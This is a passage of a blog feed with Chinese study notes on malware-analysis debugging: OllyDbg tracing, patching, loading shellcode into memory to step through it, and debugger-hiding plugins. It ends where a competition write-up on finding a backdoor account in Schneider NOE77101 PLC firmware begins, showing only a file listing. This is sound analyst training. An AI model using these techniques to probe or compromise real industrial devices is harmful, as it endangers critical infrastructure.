href="#9x7-加载DLL" class="headerlink" title="9x7 加载DLL"></a>9x7 加载DLL</h2><p>除了可以调试加载的或者附加的可执行程序，OllyDbg还可以调试DLL。然而由于DLL不能直接运行．OllyDbg使用了一个名为loaddll. exe的虚拟程序来加载它。由于恶意代码经常打包成DLL．且其大部分代码都包含在DLL的DlIMain函数（DLL的初始化函数，当DLL被加载到进程时被调用）中，因此OllyDbg的这种技术非常有用。默认情况下，一旦DLL被加载，OllyDbg会在DLL的入口点(DllMain)处中断。</p><p>如果要用参数调用被调试DLL中的导出函数，首先用OllyDbg加载DLL．然后在其入口点处暂停DLL的执行，最后单击Play按钮，运行DllMain函数，以及其他一些DLL要求的初始化操作。</p><h2 id="9x8-跟踪"><a href="#9x8-跟踪" class="headerlink" title="9x8 跟踪"></a>9x8 跟踪</h2><p>跟踪是一种强大的调试技术，它可以记录程序详细的运行信息，供你查阅。OllyDbg支持多种跟踪功能，包括：标准回溯跟踪、堆栈调用跟踪和运行跟踪等。</p><h3 id="1-标准回溯跟踪"><a href="#1-标准回溯跟踪" class="headerlink" title="1. 标准回溯跟踪"></a>1. 标准回溯跟踪</h3><p>每次你在反汇编面板窗口上执行Step Into和Step Over操作时，OllyDbg都会记录下这种动作。你可以使用键盘上的减号键（一）。退回到上一步运行的指令：使用加号键(+)．执行下一条指令。<br>如果使用Step Into，你可以跟踪每一步的执行。如果使用Step Over，只能单步跟踪step over之前区域，回溯之后再决定是否进入另一个区域。</p><h3 id="2-堆栈调用跟踪"><a href="#2-堆栈调用跟踪" class="headerlink" title="2. 堆栈调用跟踪"></a>2. 堆栈调用跟踪</h3><p>在OllyDbg中，通过堆栈跟踪可以查看一个给定函数的执行路径。为了查看堆栈调用，在主菜单中选择View-&gt;Call Stack．会弹出一个窗口，窗口中显示了当前位置之前的调用序列。<br>    为了跟踪堆栈调用，单击地址或者堆栈调用窗口中的某段。当你在那个堆栈位置时，寄存器和堆栈并不会显示什么，除非你执行运行跟踪操作。</p><h3 id="3-运行跟踪"><a href="#3-运行跟踪" class="headerlink" title="3. 运行跟踪"></a>3. 运行跟踪</h3><p>运行跟踪是指在运行代码时，OllyDbg会保存所有运行过的指令，以及它们运行过程中对寄存器和标志所做的改变。</p><blockquote><p><strong>几种激活运行跟踪的方法</strong><br>·  在反汇编面板窗口中高亮你要跟踪的代码。右键单击代码，选择Run Trace–Add Selection。代码运行后，选择View-&gt;Run Trace，查看运行过的指令。使用键盘上的一（减号键）和+（加号键），来上下浏览代码（与标准回溯跟踪小节讨论的一样）。使用这种方法，可以查看每条指令执行时所有寄存器发生的变化。<br>    ·  使用Trace Into与Trace Ovcr选项。这些选项比Add Selection更容易使用，因为它们不需要你选择需要跟踪的代码。Trace Into可以单步执行并且记录命中断点前所有的运行指令，但Trace Over仅记录当前正在运行函数的指令。<br>·  选择Select Debug-&gt;Set Condition。可以在命中条件使程序暂停之前，跟踪程序的运行。如果你想在条件断点命中时停止跟踪，并且从发生中断的位置，回溯跟踪查看如何或者为什么发生中断，这种跟踪方法将对你非常有帮助。</p></blockquote><h3 id="4-跟踪Poison-lvy"><a href="#4-跟踪Poison-lvy" class="headerlink" title="4. 跟踪Poison lvy"></a>4. 跟踪Poison lvy</h3><h2 id="9x9-异常处理"><a href="#9x9-异常处理" class="headerlink" title="9x9 异常处理"></a>9x9 异常处理</h2><p>默认情况下．OllyDbg被附加后会产生异常，附加程序也会停止运行，此时调试器开始接管控制权。调试器可以处理该异常，也可以将异常转到被调试的应用程序处理。当异常发生时．OllyDbg会暂停运行，然后你可以使用下列任一种方法，来决定是否将异常转到应用程序处理：</p><blockquote><p>·  Shift+F7将进入异常。<br>·  Shift+F8将跳过异常。<br>·  Shift+F9将运行异常处理。</p></blockquote><p>OllyDbg提供异常处理的选项，这些选项可以告诉调试器忽略某些特定异常，并且将它们直接转到应用程序处理。<br><img src="https://i.loli.net/2018/07/20/5b519f1aae2be.png" alt="im"></p><h2 id="9x10-修补"><a href="#9x10-修补" class="headerlink" title="9x10 修补"></a>9x10 修补</h2><p>OllyDbg可以很容易修改实时数据，如寄存器和标志。它也可以将汇编形式的修补代码直接插入到一个程序。你可以通过高亮选择某块区域来修改指令或内存，右击这块区域，选择Binary-&gt;Edit，会弹出让你添加操作码和数据的窗口（OllyDbg具有一些特殊功能，可以使用00项或NOP指令填充程序）。</p><h2 id="9x11-分析shellcode"><a href="#9x11-分析shellcode" class="headerlink" title="9x11 分析shellcode"></a>9x11 分析shellcode</h2><p>OllyDbg有一种分析shellcodc的简单方法。下面是使用这种方法的步骤:</p><blockquote><p>1．将shellcode从一个十六进制编辑器复制到剪切板。<br>2．在内存映射面板窗口中，选择类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享）。<br>3．双击内存映射面板窗口的某行，会弹出一个十六进制转储窗口，你可以检查它的内容。该区域应该包含几百个连续为0的字节。<br>4．在内存映射面板窗口中，右击被选择的区域，选择Set Access—Full Access，赋予该区域读、写、运行的权限。<br>5．返回内存转储窗口。0字节填充的高亮区域足以容纳整个sheUcode，右键单击选择的内存区域，然后选择Binary一Binary Paste。这个操作将步骤l中复制的shellcode粘贴到选择的区域。<br>6．设置EIP寄存器，指向你修改的内存区域（右击反汇编面板窗口的一条指令，选择New Origin Here，你可以很容易设置EIP寄存器的值）。</p></blockquote><p>上述步骤结束后，你就可以像对待正常应用程序一样运行、调试和单步整个shellcode了</p><h2 id="9x12-协助功能"><a href="#9x12-协助功能" class="headerlink" title="9x12 协助功能"></a>9x12 协助功能</h2><p>OllyDbg提供了多种机制来帮助分析，包括下面几种：</p><blockquote><p>  <strong>日志( Logging)</strong><br>  OllyDbg维护一个持续可用的事件日志。要访问这个日志，选择View-&gt;Log。此日志显示了加载的可执行模块、触发的断点，以及其他一些信息。另外，在分析过程中，日志还可以帮助你找出为到达某一特定状态而执行的那些操作。<br>    <strong>监视(Watches)窗口</strong><br>    OllyDbg支持使用监视窗口，用它可以查看你生成表达式的值。程序运行时，这个表达式会不断更新。你可以通过View—Watches，来访问监视窗口，你也可以在监视窗口中按下空格键，来设置表达式。<br>    <strong>帮助（Help）</strong>  OllyDbg的Help-&gt;Contents选项为运算表达式的书写提供了详细说明。当你想监视一些特定数据或者复杂函数时，这个帮助非常有用。例如，如果想监控EAX+ESP+4处的内存，你只需要输入表达式[EAX+ESP+4]。<br>    <strong>标注（Labeling）</strong>  如IDA Pro一样，你可以为OllyDbg中的子例程和循环添加标注。OllyDbg中的标注是为调试程序中某个地址设置的一个简单符号名称。为了在反汇编面板窗口设置标注，右击一个地址选择Label，此时会弹出提示输入标注的窗口。设置完标注以后，对这个地址的所有引用都会被该标注代替。</p></blockquote><h2 id="9x13-插件"><a href="#9x13-插件" class="headerlink" title="9x13 插件"></a>9x13 插件</h2><p>OllyDbg拥有一些标准插件，其中一些可以免费下载到。在网站 <a href="http://www.openrce.org/downloads/browse/OllyDbg_Plugins" target="_blank" rel="noopener">http://www.openrce.org/downloads/browse/OllyDbg_Plugins</a> 中，你可以找到一些对分析恶意代码有用的OllyDbg插件。<br>    OllyDbg的插件以DLL形式存在，如果要安装某个插件，你将这个插件的DLL放到OllyDbg的安装根目录下即可。一旦将DLL放入OllyDbg的安装根目录，OllyDbg会自动识别这个插件，并将其添加到插件菜单。</p><h3 id="1-OllyDump"><a href="#1-OllyDump" class="headerlink" title="1. OllyDump"></a>1. OllyDump</h3><p>OllyDump是OllyDbg最常使用的插件，它能够将一个被调试的进程转储成一个PE文件。当加载器加载一个可执行文件时，OllyDump会尝试逆向这个进程。然而，OllyDump利用的是进程内存中各段（代码段、数据段等）的状态。OllyDbg最典型的应用就是脱壳。</p><h3 id="2-调试器隐藏插件"><a href="#2-调试器隐藏插件" class="headerlink" title="2. 调试器隐藏插件"></a>2. 调试器隐藏插件</h3><p>调试器隐藏插件用多种方法对探测者隐藏调试器的存在。为了防止恶意代码使用反调试技术，恶意代码分析人员通常在分析恶意代码期间，一直运行调试器隐藏插件。这个插件主要针对IsDebuggerPresent检测、FindWindow检测、未处理异常欺骗以及用OutputDebugString反OllyDbg调试等反调试技术。</p><h3 id="3-命令行"><a href="#3-命令行" class="headerlink" title="3. 命令行"></a>3. 命令行</h3><p>要打开命令行窗口，选择Plugins-&gt;Command  Line-&gt;Command  Line。<br><img src="https://i.loli.net/2018/07/20/5b51a90a13474.jpg" alt="im"></p><h3 id="4-书签"><a href="#4-书签" class="headerlink" title="4. 书签"></a>4. 书签</h3><p>OllyDbg默认情况下自带书签插件，书签插件可以将一个内存位置加到书签中，利用书签，下次不需要记住就可以轻松获取那个内存地址。右击反汇编面板窗口中的地址，选择Bookmark-&gt;Insert Bookmark．可以添加书签。选择Plugins-&gt;Bookmarks-&gt;Bookmarks，可以浏览书签，然后单击书签可以跳转到该书签代表的地址。</p><h2 id="9x14-脚本调试"><a href="#9x14-脚本调试" class="headerlink" title="9x14 脚本调试"></a>9x14 脚本调试</h2><p>因为OllyDbg的插件被编译成DLL，创建或者修改一个插件往往是一个复杂的过程。因此，当需要扩展调试功能时，我们采用ImmDbg。它使用Python脚本来扩展功能，并且提供了易于使用的API接口。<br>    ImmDbg的Python API包含很多实用工具和函数。例如，可以将你的脚本像本地代码一样集成到调试器中，创建自定义的表格、图形和各种接u。利用脚本分析恶意代码的原因有多种，典型的包括反调试器补丁、内联函数钩子( hook)以及函数参数日志等，其中许多代码可以在网上找到。<br>    ImmDbg最常见的Python脚本类型是PyCommand．这个Python脚本位于ImmDbg安装目录下的PyCommands\目录中。编写好Python脚本后，必须将其放到这个目录下才能运行。这些脚本从命令栏运行，并且需要加上前缀“!”，如在命令行中输入!list命令，可以列出可用的PyCommand列表。<br>    PyCommand类型脚本拥有如下结构：</p><blockquote><p>．  一系列Import导入语句，用来导入Python的模块（同所有的Python脚本一样）。通过immlib或immutils模块访问ImmDbg的功能。<br>．    一个主函数，用来读取命令行参数（以Python列表传递）。<br>·  PyCommand的代码实现部分。<br>·  返回包含字符串的值。一旦脚本运行结束，主调试器会用这个返回字符串更新状态栏。</p></blockquote><p>From <a href="https://kabeor.github.io/第9章 OllyDbg/">https://kabeor.github.io/第9章 OllyDbg/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OllyDbg&quot;&gt;&lt;a href=&quot;#OllyDbg&quot; class=&quot;headerlink&quot; title=&quot;OllyDbg&quot;&gt;&lt;/a&gt;OllyDbg&lt;/h1&gt;&lt;p&gt;OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第8章 动态调试</title>
    <link href="https://kabeor.github.io/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>https://kabeor.github.io/第8章 动态调试/</id>
    <published>2018-07-10T07:15:06.123Z</published>
    <updated>2018-07-19T05:23:24.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第8章-动态调试"><a href="#第8章-动态调试" class="headerlink" title="第8章 动态调试"></a>第8章 动态调试</h1><h2 id="8x1-源代码级与汇编级的调试器"><a href="#8x1-源代码级与汇编级的调试器" class="headerlink" title="8x1 源代码级与汇编级的调试器"></a>8x1 源代码级与汇编级的调试器</h2><h2 id="8x2-内核模式与用户模式调试"><a href="#8x2-内核模式与用户模式调试" class="headerlink" title="8x2 内核模式与用户模式调试"></a>8x2 内核模式与用户模式调试</h2><p>在用户模式中，调试器与被调试的代码运行在同一个系统中<br>内核模式调试一般需要两个不同的系统<br>WinDbg是当前唯一支持内核调试的流行调试器</p><h2 id="8x3-使用调试器"><a href="#8x3-使用调试器" class="headerlink" title="8x3 使用调试器"></a>8x3 使用调试器</h2><h3 id="1-单步调试"><a href="#1-单步调试" class="headerlink" title="1. 单步调试"></a>1. 单步调试</h3><h3 id="2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into"><a href="#2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into" class="headerlink" title="2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)"></a>2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)</h3><blockquote><p>现在是使用VMware record/replay功能的最佳时机。当你单步跳过一个不会返回的函教时，可以通过重放调试会话来纠正你的错误。开始调试时就启动记录。然后，当单步跳过一个不会返回的函数时，停止记录。重放到单步跳过的函数前面，然后停止重放，取得控制权,但这次单步跳入该函数。</p></blockquote><h3 id="3-用断点暂停执行"><a href="#3-用断点暂停执行" class="headerlink" title="3. 用断点暂停执行"></a>3. 用断点暂停执行</h3><blockquote><p>软件执行断点</p></blockquote><p>调试器通过使用0XCC,即指令INT 3的机器码，重写指令的首个字节来实现软件断点，0XCC被设计来供调试器使用。当0XCC指令执行后，操作系统会产生一个异常，然后控制权转到调试器。</p><blockquote><p>硬件执行断点</p></blockquote><p>利用专门的硬件寄存器，x86结构可以支持硬件执行断点。处理器每次执行一个指令时，硬件都会检测指令的指针是否与断点地址相等。硬断点并不关心断点地址存储哪些字节。当调试修改自身的代码时，硬断点会非常有益。硬断点相比于软断点的另一个优点是，它们可以设置访问中断的断点而不是执行中断的断点。</p><p>硬件执行断点有个明显缺点：只有四个硬件寄存器存储断点的地址。<br>硬断点的深层缺陷之一是它们容易被运行的程序修改。虽然CPU芯片有八个调试寄存器，但只有六个在使用。前四个寄存器DR0〜DR3用来存储断点地址，调试控制寄存器（DR7)存储DR0〜DR3寄存器中的值是否有效，以及它们是否表示读、写或者执行断点等信息。恶意代码可以修改这些寄存器来干扰调试器。x86芯片组具有防御该干扰的功能。通过设置DR7寄存器中的通用探测（General Detect)标志位，任何执行mov指令访问调试寄存器的操作都会触发中断。而这让你能够探测调试寄存器的改变。</p><blockquote><p>条件断点</p></blockquote><p>条件断点是软件断点的一种，它在某些条件满足时才会被触发。条件断点通过调试器总是接收的软断点来实现的。调试器计算条件，如果条件不满足，它自动继续执行而不通知用户。另外，不同的调试器支持不同的条件。</p><h2 id="8x4-异常"><a href="#8x4-异常" class="headerlink" title="8x4 异常"></a>8x4 异常</h2><p>异常是调试器取得运行程序控制权的基本方式。本质上，除了断点产生异常外，与调试无关的事件，如非法内存访问、除0操作也会产生异常</p><h3 id="1-首次和二次异常处理"><a href="#1-首次和二次异常处理" class="headerlink" title="1. 首次和二次异常处理"></a>1. 首次和二次异常处理</h3><p>调试器通常有两次机会来处理同一个异常：首次处理异常和二次处理异常。调试器第一次附加到进程时，会发生一个异常，然后被调试的程序停止执行，此时调试器开始获得控制权。调试器可以自己处理异常，也可以将异常转给被调试的应用程序处理。</p><p>如果程序注册了一个异常处理函数，它会在调试器处理异常后，获得处理异常的权限。<br>如果应用程序没有处理异常，调试器将获得另一个处理它的机会—— 二次异常处理。调试器接收到一个二次处理的异常后，意味着如果程序没有附加到调试器就会崩溃。为了让应用程序正常运行，调试器必须处理异常。</p><h3 id="2-常见异常"><a href="#2-常见异常" class="headerlink" title="2. 常见异常"></a>2. 常见异常</h3><blockquote><p>最常见的是执行INT 3指令时产生的异常。调试器有专门的代码处理INT 3<br>异常，而操作系统则把它和其他异常一样对待。<br>应用程序可能包含处理INT 3异常的指令，但附加调试器到程序后，调试器将获得首先处理异常权限。如果调试器将异常传给程序，程序的异常处理函数会处理它。</p><p>单步调试也作为操作系统内的一个异常来实现。标志寄存器中的陷阱标志（trap flag)用于单步 调试。陷阱标志置位后，处理器每执行一条指令就会产生异常。</p><p>当程序试图去访问一个它无权访问的内存位置时，将产生内存访问冲突（memory-access violation)异常。这种异常经常因为内存地址无效而发生，也可能是因为访问了受保护而无权访问的内存位置。</p><p>另外，一些指令只在处理器处于特权模式时才能执行。如果程序尝试着在非特权模式下执行它们，则处理器会产生异常。</p></blockquote><h2 id="8x5-使用调试器修改可执行文件"><a href="#8x5-使用调试器修改可执行文件" class="headerlink" title="8x5 使用调试器修改可执行文件"></a>8x5 使用调试器修改可执行文件</h2><p>调试器可以用来改变程序的执行方式。可以通过修改控制标志、指令指针或者代码本身等方式来改变程序执行的方式。</p><h2 id="8x6-修改可执行程序的实践"><a href="#8x6-修改可执行程序的实践" class="headerlink" title="8x6 修改可执行程序的实践"></a>8x6 修改可执行程序的实践</h2><p>End..</p><p>From <a href="https://kabeor.github.io/第8章 动态调试/">https://kabeor.github.io/第8章 动态调试/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第8章-动态调试&quot;&gt;&lt;a href=&quot;#第8章-动态调试&quot; class=&quot;headerlink&quot; title=&quot;第8章 动态调试&quot;&gt;&lt;/a&gt;第8章 动态调试&lt;/h1&gt;&lt;h2 id=&quot;8x1-源代码级与汇编级的调试器&quot;&gt;&lt;a href=&quot;#8x1-源代码级与汇编级的
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第三篇 动态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>施耐德NOE77101以太网模块固件逆向及后门挖掘</title>
    <link href="https://kabeor.github.io/%E6%96%BD%E8%80%90%E5%BE%B7NOE77101%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%A8%A1%E5%9D%97%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%8F%8A%E5%90%8E%E9%97%A8%E6%8C%96%E6%8E%98/"/>
    <id>https://kabeor.github.io/施耐德NOE77101以太网模块固件逆向及后门挖掘/</id>
    <published>2018-07-09T08:20:21.366Z</published>
    <updated>2018-07-19T05:30:35.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施耐德NOE77101以太网模块固件逆向及后门挖掘"><a href="#施耐德NOE77101以太网模块固件逆向及后门挖掘" class="headerlink" title="施耐德NOE77101以太网模块固件逆向及后门挖掘"></a>施耐德NOE77101以太网模块固件逆向及后门挖掘</h1><p>前几天参加了 2018工业信息安全技能大赛 ，之前从没有接触过工控安全，这次的比赛让我学习了很多。</p><p>此次比赛其中一道题就是考察了施耐德NOE77101固件后门账号漏洞的问题，比赛题目要求是提交该固件Web配置APP的默认账号的密码，事实上这个版本的固件还有其他漏洞，我将在下面研究其中的一部分。</p><blockquote><p>部分思路参考了此次比赛主办方灯塔实验室的文章 <a href="http://t.cn/RdORUWo" target="_blank" rel="noopener">http://t.cn/RdORUWo</a></p></blockquote><p>NOE 771是施耐德Quantum系列PLC的以太网模块，Quantum系列PLC是施耐德的高端PLC，应用在我国核心能源调度网络系统中，如：西气东输的区域子段SCADA系统。</p><h2 id="1-静态网站分析"><a href="#1-静态网站分析" class="headerlink" title="1.静态网站分析"></a>1.静态网站分析</h2><p>题目给了一个网站文件如下<br><img src="https://i.loli.net/2018/07/19/5b50212a8e4c2.jpg" alt="mark"></p><p><strong>文件列表</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLASH0</span><br><span class="line">FLASH0/bin</span><br><span class="line">FLASH0/ftp</span><br><span class="line">FLASH0/fw</span><br><span class="line">FLASH0/gdt</span><br><span class="line">FLASH0/rdt</span><br><span class="line">FLASH0/webloader.ini</span><br><span class="line">FLASH0/wwwroot</span><br><span class="line">FLASH0/bin/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/ftp/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/fw/crashlog.txt</span><br><span class="line">FLASH0/fw/fw.ini //固件版本</span><br><span class="line">FLASH0/fw/hw.ini</span><br><span class="line">FLASH0/gdt/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/rdt/password.rde //调用密码</span><br><span class="line">FLASH0/wwwroot/cgi-bin</span><br><span class="line">FLASH0/wwwroot/classes</span><br><span class="line">FLASH0/wwwroot/conf</span><br><span class="line">FLASH0/wwwroot/html</span><br><span class="line">FLASH0/wwwroot/images</span><br><span class="line">FLASH0/wwwroot/index.htm //web首页文件</span><br><span class="line">FLASH0/wwwroot/lib</span><br><span class="line">FLASH0/wwwroot/SchneiderTFE.zip //施耐德MIB文件</span><br><span class="line">FLASH0/wwwroot/secure</span><br><span class="line">FLASH0/wwwroot/unsecure</span><br><span class="line">FLASH0/wwwroot/cgi-bin/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/classes/jvmver.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/RDE.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/SAComm.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/SysDiag.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/webcfg.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/webdiag.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/XMLParser.jar//JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/xmlrpc-1.1.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/conf/bootp</span><br><span class="line">FLASH0/wwwroot/conf/dhcp</span><br><span class="line">FLASH0/wwwroot/conf/diag</span><br><span class="line">FLASH0/wwwroot/conf/exec</span><br><span class="line">FLASH0/wwwroot/conf/fw</span><br><span class="line">FLASH0/wwwroot/conf/Gcnftcop.sys</span><br><span class="line">FLASH0/wwwroot/conf/glbdata</span><br><span class="line">FLASH0/wwwroot/conf/ioscanner</span><br><span class="line">FLASH0/wwwroot/conf/snmp</span><br><span class="line">FLASH0/wwwroot/conf/bootp/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/dhcp/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/diag/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/exec/kerVer</span><br><span class="line">FLASH0/wwwroot/conf/exec/NOE77101.bin //Quantum Ethernet Executive firmware Ver. 3.60</span><br><span class="line">FLASH0/wwwroot/conf/fw/fw.ini</span><br><span class="line">FLASH0/wwwroot/conf/glbdata/glbdata.ini</span><br><span class="line">FLASH0/wwwroot/conf/ioscanner/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/snmp/snmp.ini</span><br><span class="line">FLASH0/wwwroot/html/config.js //定义了WEB界面title可做通用设备识别</span><br><span class="line">FLASH0/wwwroot/html/english</span><br><span class="line">FLASH0/wwwroot/html/images</span><br><span class="line">FLASH0/wwwroot/html/lib</span><br><span class="line">FLASH0/wwwroot/html/english/control</span><br><span class="line">FLASH0/wwwroot/html/english/diagnostic</span><br><span class="line">FLASH0/wwwroot/html/english/documentation</span><br><span class="line">FLASH0/wwwroot/html/english/header.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home</span><br><span class="line">FLASH0/wwwroot/html/english/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/maintenance</span><br><span class="line">FLASH0/wwwroot/html/english/monitoring</span><br><span class="line">FLASH0/wwwroot/html/english/setup</span><br><span class="line">FLASH0/wwwroot/html/english/control/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/control/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/diagnostic/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/diagnostic/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/documentation/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/documentation/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home/home.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/maintenance/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/maintenance/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/monitoring/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/monitoring/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/setup/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/setup/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/images/noe77101.jpg //产品型号图片</span><br><span class="line">FLASH0/wwwroot/html/images/Telemecanique.gif</span><br><span class="line">FLASH0/wwwroot/html/images/TelemecaniquePocketPC.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/css</span><br><span class="line">FLASH0/wwwroot/html/lib/images</span><br><span class="line">FLASH0/wwwroot/html/lib/js</span><br><span class="line">FLASH0/wwwroot/html/lib/css/header.css</span><br><span class="line">FLASH0/wwwroot/html/lib/css/main.css</span><br><span class="line">FLASH0/wwwroot/html/lib/css/menu.css</span><br><span class="line">FLASH0/wwwroot/html/lib/images/left.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/images/moins.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/images/plus.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/images/right.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/js/header.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/home.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/index.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/menu.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/tools.js</span><br><span class="line">FLASH0/wwwroot/images/eight_io.gif</span><br><span class="line">FLASH0/wwwroot/images/empty.gif</span><br><span class="line">FLASH0/wwwroot/images/hiendcpu.gif</span><br><span class="line">FLASH0/wwwroot/images/logo.gif</span><br><span class="line">FLASH0/wwwroot/images/miniplc.gif</span><br><span class="line">FLASH0/wwwroot/images/module.gif</span><br><span class="line">FLASH0/wwwroot/lib/home.js</span><br><span class="line">FLASH0/wwwroot/lib/main.css</span><br><span class="line">FLASH0/wwwroot/lib/main.js</span><br><span class="line">FLASH0/wwwroot/secure/embedded</span><br><span class="line">FLASH0/wwwroot/secure/system</span><br><span class="line">FLASH0/wwwroot/secure/user</span><br><span class="line">FLASH0/wwwroot/secure/embedded/bandwidth.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/chkdsk.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/classes</span><br><span class="line">FLASH0/wwwroot/secure/embedded/dhcp_node_config.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/format_flash.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/french</span><br><span class="line">FLASH0/wwwroot/secure/embedded/ftp_passwd_config.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/german</span><br><span class="line">FLASH0/wwwroot/secure/embedded/globaldata.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/http_passwd_config.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/images</span><br><span class="line">FLASH0/wwwroot/secure/embedded/ioscanning.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/messaging.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/reboot.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/set_readonly.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/smtpconf.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/smtpdiag.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/spanish</span><br><span class="line">FLASH0/wwwroot/secure/embedded/support.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/web_page_Ver.ini</span><br><span class="line">FLASH0/wwwroot/secure/embedded/classes/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/french/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/german/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/images/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/spanish/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/system/ctrlstat.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/ethernet.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/plccfg.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/rde.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/riostat.htm</span><br><span class="line">FLASH0/wwwroot/secure/user/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/unsecure/user</span><br><span 